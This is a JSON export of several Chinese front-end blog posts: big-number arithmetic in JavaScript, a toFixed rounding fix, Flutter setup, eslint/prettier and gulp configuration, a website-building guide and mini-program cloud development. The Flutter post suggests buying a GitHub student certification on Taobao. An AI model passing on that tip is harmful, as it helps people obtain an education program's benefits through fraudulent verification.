&#123; max = Math.ceil((parseInt(Adb.substr(0, 2)) + 1) / b0); &#125; else &#123; result.push(0); Adb += A[0]; A = A.substr(1); continue; &#125; for (let i = max - 1; i &gt;= 0; i--) &#123; if (i === 0) &#123; result.push(0); Adb += A[0]; A = A.substr(1); break; &#125; else &#123; temp = temp || multiply(B, i + ''); r = compare(temp, Adb); if (r === 0 || r === -1) &#123; result.push(i); if (r) &#123; Adb = reduce(Adb, temp); Adb += A[0]; &#125; else &#123; Adb = A[0]; &#125; A = A.substr(1); break; &#125; else &#123; temp = reduce(temp, B); &#125; &#125; &#125; temp = 0; &#125; for (let i = 0; i &lt; fill; i++) &#123; result.unshift('0'); &#125; result.splice(result.length - point, 0, '.'); if (!result[0] &amp;&amp; result[1] !== '.') &#123; result.shift(); &#125; point = false; let position = result.indexOf('.'); for (let i = position + 1; i &lt; result.length; i++) &#123; if (result[i]) &#123; point = true; break; &#125; &#125; if (!point) &#123; result.splice(position); &#125; result = result.join(''); return result;&#125;function multiply(A, B) &#123; let result = []; (A += ''), (B += ''); const l = -4; // 以支持百万位精确运算，但速度减半 let r1 = [], r2 = []; while (A !== '') &#123; r1.unshift(parseInt(A.substr(l))); A = A.slice(0, l); &#125; while (B !== '') &#123; r2.unshift(parseInt(B.substr(l))); B = B.slice(0, l); &#125; let index, value; for (let i = 0; i &lt; r1.length; i++) &#123; for (let j = 0; j &lt; r2.length; j++) &#123; value = 0; if (r1[i] &amp;&amp; r2[j]) &#123; value = r1[i] * r2[j]; &#125; index = i + j; if (result[index]) &#123; result[index] += value; &#125; else &#123; result[index] = value; &#125; &#125; &#125; for (let i = result.length - 1; i &gt; 0; i--) &#123; result[i] += ''; if (result[i].length &gt; -l) &#123; result[i - 1] += parseInt(result[i].slice(0, l)); result[i] = result[i].substr(l); &#125; while (result[i].length &lt; -l) &#123; result[i] = '0' + result[i]; &#125; &#125; if (result[0]) &#123; result = result.join(''); &#125; else &#123; result = '0'; &#125; return result;&#125;function add(A, B) &#123; let result = []; (A += ''), (B += ''); const l = -15; while (A !== '' &amp;&amp; B !== '') &#123; result.unshift(parseInt(A.substr(l)) + parseInt(B.substr(l))); A = A.slice(0, l); B = B.slice(0, l); &#125; A += B; for (let i = result.length - 1; i &gt; 0; i--) &#123; result[i] += ''; if (result[i].length &gt; -l) &#123; result[i - 1] += 1; result[i] = result[i].substr(1); &#125; else &#123; while (result[i].length &lt; -l) &#123; result[i] = '0' + result[i]; &#125; &#125; &#125; while (A &amp;&amp; (result[0] + '').length &gt; -l) &#123; result[0] = (result[0] + '').substr(1); result.unshift(parseInt(A.substr(l)) + 1); A = A.slice(0, l); &#125; if (A) &#123; while ((result[0] + '').length &lt; -l) &#123; result[0] = '0' + result[0]; &#125; result.unshift(A); &#125; if (result[0]) &#123; result = result.join(''); &#125; else &#123; result = '0'; &#125; return result;&#125;function reduce(A, B) &#123; let result = []; (A += ''), (B += ''); while (A[0] === '0') &#123; A = A.substr(1); &#125; while (B[0] === '0') &#123; B = B.substr(1); &#125; const l = -15; let N = '1'; for (let i = 0; i &lt; -l; i++) &#123; N += '0'; &#125; N = parseInt(N); while (A !== '' &amp;&amp; B !== '') &#123; result.unshift(parseInt(A.substr(l)) - parseInt(B.substr(l))); A = A.slice(0, l); B = B.slice(0, l); &#125; if (A !== '' || B !== '') &#123; let s = B === '' ? 1 : -1; A += B; while (A !== '') &#123; result.unshift(s * parseInt(A.substr(l))); A = A.slice(0, l); &#125; &#125; while (result.length !== 0 &amp;&amp; result[0] === 0) &#123; result.shift(); &#125; let s = ''; if (result.length === 0) &#123; result = 0; &#125; else if (result[0] &lt; 0) &#123; s = '-'; for (let i = result.length - 1; i &gt; 0; i--) &#123; if (result[i] &gt; 0) &#123; result[i] -= N; result[i - 1]++; &#125; result[i] *= -1; result[i] += ''; while (result[i].length &lt; -l) &#123; result[i] = '0' + result[i]; &#125; &#125; result[0] *= -1; &#125; else &#123; for (let i = result.length - 1; i &gt; 0; i--) &#123; if (result[i] &lt; 0) &#123; result[i] += N; result[i - 1]--; &#125; result[i] += ''; while (result[i].length &lt; -l) &#123; result[i] = '0' + result[i]; &#125; &#125; &#125; if (result) &#123; while ((result[0] = parseInt(result[0])) === 0) &#123; result.shift(); &#125; result = s + result.join(''); &#125; return result;&#125; 使用方法：不可使用负数，参数最好使用字符串 1234divide(A,B) // 除法multiply(A,B) //乘法add(A,B) //加法reduce(A,B) //减法 toFixed 的修复在Firefox / Chrome中，toFixed并不会对于最后一位是5的如愿以偿的进行四舍五入。 1234561.35.toFixed(1) // 1.4 正确1.335.toFixed(2) // 1.33 错误1.3335.toFixed(3) // 1.333 错误1.33335.toFixed(4) // 1.3334 正确1.333335.toFixed(5) // 1.33333 错误1.3333335.toFixed(6) // 1.333333 错误 Firefox 和 Chrome的实现没有问题，根本原因还是计算机里浮点数精度丢失问题。 修复方式： 123456function toFixed(num, s) &#123; var times = Math.pow(10, s) var des = num * times + 0.5 des = parseInt(des, 10) / times return des + ''&#125; 参考链接：https://blog.csdn.net/qq_41827547/article/details/89487456","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"js运算","slug":"js运算","permalink":"//www.shen.ee/tags/js运算/"},{"name":"js计算","slug":"js计算","permalink":"//www.shen.ee/tags/js计算/"},{"name":"js浮点数计算","slug":"js浮点数计算","permalink":"//www.shen.ee/tags/js浮点数计算/"},{"name":"js超长数字计算","slug":"js超长数字计算","permalink":"//www.shen.ee/tags/js超长数字计算/"},{"name":"js计算精度问题","slug":"js计算精度问题","permalink":"//www.shen.ee/tags/js计算精度问题/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"Flutter开发环境搭建","slug":"Flutter开发环境搭建","date":"2018-12-24T09:39:15.000Z","updated":"2021-11-15T07:55:36.536Z","comments":true,"path":"article/40441.html","link":"","permalink":"//www.shen.ee/article/40441.html","excerpt":"","text":"​ 工欲善其事,必先利其器 科学上网Flutter谷歌的，因为国内的某些原因，没办法正常访问或者下载一些依赖的，这时候一个能访问墙外的网络就尤为重要，你们懂得。 可以自己去买服务器搭建，在这里不做另外说明，推荐一篇搭建教程：https://www.shen.ee/article/45273.html 我主要说下服务器，最近Vultr被墙的厉害，所以大家还是换个，我目前用的 DO还是很不错的。地址：https://m.do.co/c/dcde442ba814 首先咱们可以通过某宝买个github学生认证，除了拥有了私有仓库外。免费的IDE正版使用等等，其实还有一大堆福利： 上图中间就是DO免费的50美元优惠券了。另外通过上面DO链接注册完成paypal绑定支付5美金后，还会赠送100美元信用金余额，可以购买服务器。美滋滋。 安装JAVA其实跟我之前写的那篇文章类似，只是现在系统变成了Windows，CentOS 7 安装 JAVA环境（JDK 1.8） 下载地址：https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 如图，请记得点击 接受许可协议。 安装一路回车就好，安装完会自动弹出安装 JRE的程序，安装就好。安装完成后，打开cmd执行 java，出现下图的结果，即表示安装成功。 安装FLutter SDK目前已经出了稳定版，咱们选择 Stable channel V1.0.0版本下载即可。下载地址：https://flutter.io/docs/development/tools/sdk/archive?tab=windows#windows 下载完成后解压再你想要安装的目录，例如D:\\fluter\\flutter ，这个随意，但是不要安装到需要权限高的路径。 配置环境变量电脑上计算机右键属性，依次打开 在Path里添加你的Flutter SDK的安装目录的bin目录，例如我的在 E:\\Flutter\\flutter\\bin 那么在Path里新建一个值为 E:\\Flutter\\flutter\\bin的环境变量保存即可。 配置完成，可以在cmd执行下 flutter检测的命令 1flutter doctor 然后发现好多错误，不着急，先忽略这里往下看。 12345678910111213141516[√] Flutter (Channel stable, v1.0.0, on Microsoft Windows [Version 10.0.17134.472], locale zh-CN)[X] Android toolchain - develop for Android devices X Unable to locate Android SDK. Install Android Studio from: https://developer.android.com/studio/index.html On first launch it will assist you in installing the Android SDK components. (or visit https://flutter.io/setup/#android-setup for detailed instructions). If Android SDK has been installed to a custom location, set $ANDROID_HOME to that location. You may also want to add it to your PATH environment variable.[√] Android Studio (version 3.2) X Flutter plugin not installed; this adds Flutter specific functionality. X Dart plugin not installed; this adds Dart specific functionality.[!] Connected device ! No devices available! Doctor found issues in 2 categories. 安装Android Studio下载地址：https://developer.android.com/ 进入后往下拉，点击下载 下载完成后还是一路Next，它会自动安装Android SDK，到最后下载组件时会很慢，因为要去Google下载很多东西，所以你如果没有梯子，还是算了吧。 安装Flutter插件安装成功后，打开设置 选择 Browse repositories 搜索 flutter 然后安装，安装时会弹窗提示你自动安装Dart同意即可。 安装完成后，重启Android Studio。 重启完成后再次输入检测命令 1flutter doctor 这次可以明显看到错误少了 根据提示执行如下命令，接下来的提示全部输入 Y1flutter doctor --android-licenses 安装AVD虚拟机接下再次执行flutter doctor可以看到就一个 No devices available的警告了，因为咱们虚拟机还没安装，接下来咱们打开Andorid Studio新建一个 Flutter的项目。 选择Flutter 应用 填写一些项目配置信息 接下来设置包名 打开工具导航栏的选择 Tools =&gt; AVD Manager创建一个虚拟机 选择你想要的虚拟机类型然后下一步 接下来选择系统版本，这里就用最新的9.0，先点击Download下载然后在安装，这个过程可能会很慢。安装完成后，打开运行按钮即可运行起来了。 运行Flutter项目打开我们刚刚创建的那个Flutter项目，点击debug开始编译(会比较慢) 至此Flutter开发环境就搭建完成了。 VS Code编写Flutter首先安装Flutter插件，会自动安装Dart插件，安装完成重启即可。 快速开启虚拟机 1.找到emulator.exe这个程序文件路径，emulator目录下的。例如：E:\\Android\\Sdk\\emulator\\emulator.exe2.打开Android Studio，查看你的AVD虚拟机名称，例如：Nexus 5X API 283.新建一个.bat文件，名字自己随意起，内容如下： 1E:\\Android\\Sdk\\emulator\\emulator.exe -netdelay none -netspeed full -avd Nexus_5X_API_28 参数说明： -netdelay none :设置模拟器的网络延迟时间，默认为none，就是没有延迟。 -netspeed full: 设置网络加速值，full代表全速。 以后编写Flutter项目，运行这个bat文件即可快速打开虚拟机。 VSCode实时自动编译快捷键：F5 本文章是在阅读胖哥（技术胖）Flutter免费教程整理而来，算是自己做了个备份。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"Flutter","slug":"Flutter","permalink":"//www.shen.ee/tags/Flutter/"},{"name":"FLutter SDK","slug":"FLutter-SDK","permalink":"//www.shen.ee/tags/FLutter-SDK/"},{"name":"Android Studio","slug":"Android-Studio","permalink":"//www.shen.ee/tags/Android-Studio/"},{"name":"Android SDK","slug":"Android-SDK","permalink":"//www.shen.ee/tags/Android-SDK/"},{"name":"虚拟机","slug":"虚拟机","permalink":"//www.shen.ee/tags/虚拟机/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"VS Code书写vue项目配置 eslint+prettier 统一代码风格","slug":"VS Code书写vue项目配置 eslint+prettier 统一代码风格","date":"2018-11-09T08:13:23.000Z","updated":"2021-11-15T07:55:36.537Z","comments":true,"path":"article/53066.html","link":"","permalink":"//www.shen.ee/article/53066.html","excerpt":"","text":"前言以前公司的vue项目只是我一个人在写，代码风格统一，但是后来随着团队增加，统一的代码风格就越来越重要。我的主力工具是sublime，ws辅助，vscode基本很少使用（就下载安装放在冷宫），但是听说用来写vue项目还不错，就开启了一番折腾。当然工具么，没有谁好谁坏了~~ 不盲目站队，适合自己的就是最好的。 目标是：Eslint校验代码语法，prettier统一格式化代码，按下保存自动修复eslint错误，自动格式化代码（因为懒~） 安装vscode插件首先，需要安装 Vetur、ESLint、Prettier - Code formatter这三个插件，安装完重启下，防止插件不生效。 另外这里有个坑， Beautify插件会占用格式化代码的快捷键，因此会和prettier产生冲突，所以直接禁用掉。 vscode插件配置打开vscode工具的设置（快捷键 Ctrl + ,）里面有两个设置。 一个是 USER SETTINGS（用户设置）也就是全局配置，其他项目也会应用这个配置。 另一个是WORKSPACE SETTINGS（工作区设置）也就是项目配置，会在当前项目的根路径里创建一个.vscode/settings.json文件，然后配置只在当前项目生效。 我把配置写在了工作区设置，配置如下： 123456789101112131415161718192021222324252627&#123; //.vue文件template格式化支持，并使用js-beautify-html插件 \"vetur.format.defaultFormatter.html\": \"js-beautify-html\", //js-beautify-html格式化配置，属性强制换行 \"vetur.format.defaultFormatterOptions\": &#123; \"js-beautify-html\": &#123; \"wrap_attributes\": \"force-aligned\" &#125; &#125;, //根据文件后缀名定义vue文件类型 \"files.associations\": &#123; \"*.vue\": \"vue\" &#125;, //配置 ESLint 检查的文件类型 \"eslint.validate\": [ \"javascript\", \"javascriptreact\", &#123; \"language\": \"vue\", \"autoFix\": true &#125; ], //保存时eslint自动修复错误 \"eslint.autoFixOnSave\": true, //保存自动格式化 \"editor.formatOnSave\": true&#125; ESLint 和 Prettier 的冲突修复由于需要同时使用prettier和eslint，而prettier的一些规则和eslint的一些规则可能存在冲突，例如prettier字符串默认是用双引号而esLint定义的是单引号的话这样格式化之后就不符合ESLint规则了。 所以要解决冲突就需要在Prettier的规则配置里也配置上和ESLint一样的规则，直接覆盖掉，ESLint和Prettier的配置文件内容如下： .eslintrc.js 配置使用单引号、结尾不能有分号。 123456789101112131415161718module.exports = &#123; root: true, env: &#123; node: true &#125;, extends: ['plugin:vue/essential', 'eslint:recommended'], rules: &#123; 'no-console': process.env.NODE_ENV === 'production' ? 'error' : 'off', 'no-debugger': process.env.NODE_ENV === 'production' ? 'error' : 'off', //强制使用单引号 quotes: ['error', 'single'], //强制不使用分号结尾 semi: ['error', 'never'] &#125;, parserOptions: &#123; parser: 'babel-eslint' &#125;&#125; .prettierrc 配置使用单引号、结尾不能有分号。 12345678&#123; //开启 eslint 支持 \"eslintIntegration\": true, //使用单引号 \"singleQuote\": true, //结尾不加分号 \"semi\": false&#125; 也可以直接在vscode工作区配置prettier 12345678&#123; //开启 eslint 支持 \"prettier.eslintIntegration\": true, //使用单引号 \"prettier.singleQuote\": true, //结尾不加分号 \"prettier.semi\": false,&#125; 效果预览 最后这下再也不用看到别人代码一团糟吐槽了。第一次折腾vscode，参考了很多网上大佬的文章，但是感觉这个配置好像还差了哪里，但又始终不知道问题在哪里，热烈欢迎大家交流指教。","categories":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}],"tags":[{"name":"vscode","slug":"vscode","permalink":"//www.shen.ee/tags/vscode/"},{"name":"eslint","slug":"eslint","permalink":"//www.shen.ee/tags/eslint/"},{"name":"prettier","slug":"prettier","permalink":"//www.shen.ee/tags/prettier/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}]},{"title":"基于gulp的前端自动化方案","slug":"gulp自动化","date":"2018-10-24T10:44:30.000Z","updated":"2021-11-15T07:55:36.540Z","comments":true,"path":"article/58291.html","link":"","permalink":"//www.shen.ee/article/58291.html","excerpt":"","text":"前言 ​ 最近几年前端技术发展日新月异，特别是单页应用的普及。组件化、工程化、自动化成了前端发展的趋势。webpack已经成为了前端打包构建的主流，但是一些老古董的项目还是存在的，也有优化的必要，正好公司的老项目需要优化，不多说拿gulp实践一下。 本文需要安装node（自行安装），并了解过gulp入门。gulp脚本下载：https://github.com/youhunwl/gulp 欢迎star。 实践创建项目目录首先初始化npm依赖项与基本信息，使用命令npm init一直回车，生成package.json文件，也可以直接去上边github仓库目录下载。 你的项目目录关系到你的gulp脚本里的任务路径，我脚本里写的是匹配所有的目录和文件。我简单举个例子：这里js/common里的js文件也会被处理。如果只想处理特定目录的文件，请修改任务里的路径。 12345678910demo/├── css/│ ├── index.css├── js/│ ├── common/│ │ └─ common.js│ ├── index.js├── img/│ ├── logo.png└── index.html 安装所需依赖安装gulp所需要的模块，这里直接列举我的package.json文件内容 123456789101112131415161718192021222324&#123; \"name\": \"demo\", \"version\": \"0.0.0\", \"private\": true, \"dependencies\": &#123;&#125;, \"devDependencies\": &#123; \"gulp\": \"^3.9.1\", \"gulp-autoprefixer\": \"^3.1.1\", \"gulp-cache\": \"^1.0.2\", \"gulp-clean-css\": \"^3.10.0\", \"gulp-htmlclean\": \"^2.7.15\", \"gulp-htmlmin\": \"^3.0.0\", \"gulp-if\": \"^2.0.2\", \"gulp-imagemin\": \"^4.1.0\", \"gulp-minify-css\": \"^1.2.4\", \"gulp-notify\": \"^3.0.0\", \"gulp-path\": \"^3.0.3\", \"gulp-rev-append\": \"^0.1.8\", \"gulp-sequence\": \"^0.4.6\", \"gulp-sourcemaps\": \"^2.6.4\", \"gulp-uglify\": \"^2.0.0\", \"uglify-js\": \"^3.3.9\" &#125;&#125; 编写gulp脚本新建 gulpfile.js文件,并引入所需模块，这里我把路径统一写在PATHS中。具体关于路径的写法，可以去看gulp官网的api：https://www.gulpjs.com.cn/docs/api/ gulp-minify-css这个官网提示已经弃用，改用gulp-clean-css，这里保留只是为了告诉大家，效果一样，用户一致，为了保证项目不出问题，还是用最新的吧。 1234567891011121314151617181920212223'use strict';var gulp = require('gulp'), minifycss = require('gulp-minify-css'),//压缩css 已弃用 cleancss = require('gulp-clean-css'),//压缩css imagemin = require('gulp-imagemin'),//压缩图片 autoprefixer = require('gulp-autoprefixer'),//处理浏览器前缀 uglify = require('gulp-uglify'),//压缩js sourcemaps = require('gulp-sourcemaps'),//生成 sourcemap gulpif = require('gulp-if'),//条件判断 notify = require('gulp-notify'),//处理报错 cache = require('gulp-cache'),//只压缩修改的图片 htmlclean = require('gulp-htmlclean'),// 精简html htmlmin = require('gulp-htmlmin'),//压缩html rev = require('gulp-rev-append'),//增加版本号 sequence = require('gulp-sequence'),//同步执行任务 PATHS = &#123; ROOT: './', DEST: './dist/', HTML: '**/*.&#123;html,htm&#125;', CSS: '**/*.css', IMG: '**/*.&#123;png,jpg,gif,ico&#125;', JS: '**/*.js'&#125; 压缩处理css这里需要排除node_modules文件夹和生成构建的后的目录/dist/及它们的子目录，直接 !后面跟要排除的目录就行了。 123456789101112131415gulp.task('minify-css', function () &#123; return gulp.src([PATHS.CSS,'!./dist/**', '!./node_modules/**']) .pipe(sourcemaps.init()) .pipe(autoprefixer(&#123; browsers: ['last 10 versions', 'Firefox &gt;= 20', 'Opera &gt;= 36', 'ie &gt;= 9', 'Android &gt;= 4.0', ], cascade: true, //是否美化格式 remove: false //是否删除不必要的前缀 &#125;)) .pipe(cleancss(&#123; keepSpecialComments: '*' //保留所有特殊前缀 &#125;)) .pipe(sourcemaps.write('.')) .pipe(gulp.dest(PATHS.DEST)) .pipe(notify(&#123; message: 'css minify complete' &#125;));&#125;); 有些引用的css或者js不需要压缩,比如jQuery‘,Bootstrap，也或者是公司内部的公共库 .min.{css,js}等等。 这里咱们就用到gulp-if了，去排除min.css 123456var conditionCss = function (f) &#123; if (f.path.endsWith('.min.css')) &#123; return false; &#125; return true;&#125;; 再修改下处理css的操作 123.pipe(gulpif(conditionCss, cleancss(&#123; keepSpecialComments: '*' //保留所有特殊前缀&#125;))) 压缩处理js同理排除下 min.js ，这里还要注意记得把 gulp脚本也排除不处理。 12345678gulp.task('minify-js', function () &#123; return gulp.src([PATHS.JS, '!./dist/**', '!./node_modules/**', '!gulpfile.js']) .pipe(sourcemaps.init()) .pipe(gulpif(conditionJs, uglify())) .pipe(sourcemaps.write('.')) .pipe(gulp.dest(PATHS.DEST)) .pipe(notify(&#123; message: 'js minify complete' &#125;));&#125;); 压缩处理 img12345gulp.task('minify-img', function () &#123; return gulp.src([PATHS.IMG,'!./dist/**', '!./node_modules/**']) .pipe(cache(imagemin())) .pipe(gulp.dest(PATHS.DEST));&#125;); 压缩处理HTML123456789101112gulp.task('minify-html', function () &#123; return gulp.src(PATHS.DEST+PATHS.HTML) .pipe(htmlclean()) .pipe(htmlmin(&#123; removeComments: true, //清除HTML注释 collapseWhitespace: true, //压缩HTML minifyJS: true, //压缩页面JS minifyCSS: true, //压缩页面CSS minifyURLs: true &#125;)) .pipe(gulp.dest(PATHS.DEST));&#125;); 增加版本号12345gulp.task('rev', function () &#123; return gulp.src([PATHS.HTML,'!./dist/**', '!./node_modules/**']) .pipe(rev()) .pipe(gulp.dest(PATHS.DEST));&#125;); 同步执行task因为gulp所有的任务都是异步完成的，在有时候我们需要同步执行任务，比如：先编译less,在对编译好的css进行压缩，这个时候异步就有问题了。 1gulp.task('deploy', sequence(['minify-css', 'minify-js'], 'minify-img', 'rev', 'minify-html')); 执行gulp所有任务这里创建一个名为default 的任务，执行上面的deploy任务 123gulp.task('default', ['deploy'], function (e) &#123; console.log(\"[complete] Please continue to operate\");&#125;) 部署在终端中输入 gulp或者gulp default执行构建，即可在我们设置的产出目录里看到我们压缩处理后的代码。 至此，一个简单的gulp脚本就写的差不多了，麻雀虽小五脏俱全。如果大家有什么好的建议欢迎交流。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"Gulp","slug":"Gulp","permalink":"//www.shen.ee/tags/Gulp/"},{"name":"Node","slug":"Node","permalink":"//www.shen.ee/tags/Node/"},{"name":"前端自动化","slug":"前端自动化","permalink":"//www.shen.ee/tags/前端自动化/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"手把手教你搭建一个属于自己的网站","slug":"手把手教你搭建一个属于自己的网站","date":"2018-10-17T02:13:03.000Z","updated":"2021-11-15T07:55:36.546Z","comments":true,"path":"article/52925.html","link":"","permalink":"//www.shen.ee/article/52925.html","excerpt":"","text":"​ 其实去年就写过一篇，当时写的很简短，算是基础的基础，今天就再来一起分享下网站建设方面的知识。看过之前我写的那篇的可以直接从基础篇备案看起。 ps：以下内容为了便于理解，部分是本人自己理解总结，非官方解释，大佬勿喷 基础篇认识网站网站也可以理解为web应用程序，只不过无需用户下载，只要有网络，随时随地都能访问。 网站的组成网站的基本组成：域名、网站空间（服务器，vps）、网站程序、数据库等。 域名可以简单的理解为网址，如果没有域名的话，访问网站只能使用ip地址，但是ip地址 ‘长又不好记’ ，所以就有了域名。 通俗的说，域名就相当于一个家庭的门牌号码，别人通过这个号码可以很容易的找到你。 网站空间先说说服务器：是提供计算服务的设备，和咱们的电脑架构类似，相当于一台24小时不关机的电脑（性能要比普通电脑强很多倍） VPS：即指虚拟专用服务器，是将一个服务器分区成多个虚拟独立专享服务器的技术。每个使用VPS技术的虚拟独立服务器拥有各自独立的公网IP地址、操作系统、硬盘空间、内存空间、CPU资源等，还可以进行安装程序、重启服务器等操作，与运行一台独立服务器完全相同。 网站空间就是咱们所谓的虚拟主机，虚拟主机是在网络服务器上划分出一定的磁盘空间供用户放置站点、应用组件等；提供必要的站点功能、数据存放和传输功能。 通俗的说服务器就是一个小区，vps就相当于这个小区里的每栋楼房或者xx单元，虚拟主机就是服务器或者VPS租出去的每一个房屋，域名就相当于门牌号，有了这个门牌号，才可以知道别人在的具体位置 当然如果嫌麻烦可以直接使用github pages或者coding pages去托管你的静态资源。 网站程序（网站源代码）程序就是建设网站所有使用的编程语言，换成源代码就是一堆按一定格式书写的文字和符号。源代码是指原始代码，可以是任何语言代码。 比如大家随便写一个html文件，这就算是一个程序。 数据库最开始的网站都是静态网站，用来展示一些数据，无法存储数据。 后来有了动态网站，就有了数据库，通俗的理解为就是一个大的仓库。 有了数据库，我们可以保存用户信息，商品信息，等很多数据信息。 网站分类根据网站所用编程语言分类：例如asp网站、php网站、jsp网站、Asp. net网站等；根据网站的用途分类：例如门户网站（综合网站）、行业网站、娱乐网站等；根据网站的功能分类：例如单一网站（企业网站）、多功能网站（网络商城）等等。根据网站的持有者分类：例如个人网站、商业网站、政府网站、教育网站等。根据网站的商业目的分类：营利型网站（行业网站、论坛）、非营利性型网站（企业网站、政府网站、教育网站）。 备案域名备案 凡是你使用的主机在中国大陆，那你当前绑定的域名都需要备案（网站ICP备案），指向外国主机或服务器则不需要备案，具体备案流程可以自行搜索。 如果你只是买来域名收藏或者投资，不是用来建站，那就无需备案了。 17年的时候管局又更改了规则，好多域名都已经在国内无法取得备案了，下面是一份来自管局的可以备案的域名单：http://xn--fiq8ituh5mn9d1qbc28lu5dusc.xn--zfr164b/ 公网安备 如上图，这就是公网安备，这种一般是交互式网站需要去当地所在公安局登记，这个备案的作用是为了当地公安局对网络安全进行管理和监督。一般个人非营利性网站申请公网安备的少之又少，原因你们懂得。 交互式网站备案成功后，基本你就处于网警的监督下了，一旦出了问题（遗漏屏蔽关键词等），警察直接能找到你个人或单位，处罚是很严重的，不可儿戏。 实战篇准备虚拟主机可以看下景安的或者阿里云的，但是现在大厂的云服务器活动都很多，也非常便宜，之前在博客整理过阿里云近期的优惠活动：https://www.iyouhun.com/post-123.html. 这里我就用我服务器开的主机做演示。 域名就更不用说了，现在各大idc一直有活动，几块钱就能注册一年，如果是测试也可以使用免费的tk、ml等等。这里补充一个新网的活动，新用户免费撸1年域名 4个自选 需实名认证http://www.xinnet.com/composite/zt/2018Y1012domain.html （真的不是广告，碰巧看到的） 自行备好程序，上次我演示是用的静态html，这次就用typecho程序做演示。 工具：FlashFXP.zip 上传程序打开 FlashFXP &gt; 点击会话 &gt; 快速连接 连接类型选择FTP按要求输入主机信息 如果是服务器则选择 SFTP over SSH 按要求输入服务器信息 然后将你的程序上传到主机根目录里，如果主机管理平台支持在线解压就上传压缩包，在管理面板解压，不支持就本地解压上传。注意，一般网站虚拟主机都有默认文件夹配置（例如、根目录文件夹、备份文件夹、日志文件夹） 如下图：默认左侧是远程主机内容，右侧是本地计算机文件，选中你要上传的程序，右键 &gt; 传输选定的项 绑定域名首先去域名管理平台解析域名（也就是你购买域名的地方） 然后进入域名解析页面，添加解析保存即可，记录类型看你主机商要求，一般是A 一般购买的虚拟主机都会有一个管理虚拟主机的页面，在这里你可以查看所有主机信息，并且可以给主机绑定域名。 安装程序如果你是静态的网站，没有后台不用配置数据库等等，那到这里直接访问你绑定的域名就行了，至此这个网站就好了，可以去尝试做下SEO优化，这样百度就会更容易收录你的网站了。 还有一种是需要在程序文件中配置数据库信息例如config.php、config.asp等等，或者访问特定的路径安装，例如访问：域名/install、域名/install.php等等。 一般的开源程序，都有引导式安装，第一次访问你绑定的域名，它会自动识别程序是否安装，未安装则跳转到安装页面。如下图typecho 然后就是输入数据库信息网站管理信息等配置信息。 这就是搭建好的网站啦 总结这里我拿的 typecho开源程序做的演示，自己写的也好，直接使用别人开源的也好，所有的程序安装都大同小异。格外注意下主机/服务器环境和与程序所需安装环境是否匹配就行了。","categories":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}],"tags":[{"name":"网站建设","slug":"网站建设","permalink":"//www.shen.ee/tags/网站建设/"}],"keywords":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}]},{"title":"小程序的全栈开发新时代","slug":"小程序云开发","date":"2018-09-19T06:55:48.000Z","updated":"2021-11-15T07:55:36.545Z","comments":true,"path":"article/9789.html","link":"","permalink":"//www.shen.ee/article/9789.html","excerpt":"","text":"原文链接 什么是小程序·云开发小程序·云开发是微信团队和腾讯云团队共同研发的一套小程序基础能力，简言之就是：云能力将会成为小程序的基础能力。整套功能是基于腾讯云全新推出的云开发(Tencent Cloud Base)所研发出来的一套完备的小程序后台开发方案。 小程序·云开发为开发者提供完整的云端流程，简化后端开发和运维概念，无需搭建服务器，使用平台提供的 API 进行核心业务开发，即可实现快速上线和迭代。 该解决方案目前提供三大基础能力支持： 存储：在小程序前端直接上传/下载云端文件，在小程序云控制台可视化管理 数据库：一个既可在小程序前端操作，也能在云函数中读写的文档型数据库 云函数：在云端运行的代码，微信私有协议天然鉴权，开发者只需编写业务逻辑代码 未来，我们还会集成更多的服务能力，为小程序提供更强有力的云端支持。 如何使用小程序·云开发 上面就是小程序·云开发简单的使用图谱：在小程序端，直接用官方提供的接口，在云函数端，直接用官方提供的 Node SDK，就可以操作你云的资源。以前开发小程序所担忧的数据库搭建、文件系统部署，通通没有。 你只需要有在小程序开发 IDE 里面的 云开发，开通一下，填写环境 ID，便可以拥有小程序的云能力！ 当然，其实用云开发，并不排斥原有的后台架构，通过下面的架构，你也可以无缝与原有的后台服务兼容，也简化了一些小程序鉴权的逻辑： 接下来，我会分别从小程序端、服务端讲述如何使用这些云资源。 使用云能力小程序端客户端，这里是指在小程序端中。如果要使用云开发能力，请做以下配置： 在 app.json / game.json 中， 中增加字段 &quot;cloud&quot;: true project.config.json 中增加了字段 cloudfunctionRoot 用于指定存放云函数的目录 初始化云开发能力： 12345678//app.jsApp(&#123; onLaunch: function () &#123; wx.cloud.init(&#123; traceUser: true // 用户信息会显示在云开发控制台的用户面板中 &#125;); &#125;&#125;); 小程序端初始化能力文档 在用户管理中会显示使用云能力的小程序的访问用户列表，默认以访问时间倒叙排列，访问时间的触发点是在小程序端调用 wx.cloud.init 方法，且其中的 traceUser 参数传值为 true。 服务端如果你想在云函数中，操作文件、数据库和云函数资源，你可以使用我们提供的服务端 SDK 进行操作。首先，进入到你的某个云函数中，安装以下依赖包： 1npm i --save tcb-admin-node 在云函数中初始化 12345678910111213141516171819// 初始化示例const app = require('tcb-admin-node');// 初始化资源// 云函数下不需要secretId和secretKey。// env如果不指定将使用默认环境app.init(&#123; secretId: 'xxxxx', secretKey: 'xxxx', env: 'xxx'&#125;);//云函数下使用默认环境app.init()//云函数下指定环境app.init(&#123; env: 'xxx'&#125;); 服务端初始化文档 存储云开发提供存储空间、上传文件、下载文件、CDN加速文件访问等能力,开发者可以在小程序端与服务端通过 API 使用这些能力。 小程序端12345678910111213// 选择图片wx.chooseImage(&#123; success: dRes =&gt; &#123; // 上传图片 const uploadTask = wx.cloud.uploadFile(&#123; cloudPath: `$&#123;Date.now()&#125;-$&#123;Math.floor(Math.random(0, 1) * 10000000)&#125;.png`, // 随机图片名 filePath: dRes.tempFilePaths[0], // 本地的图片路径 success: console.log, fail: console.error &#125;); &#125;, fail: 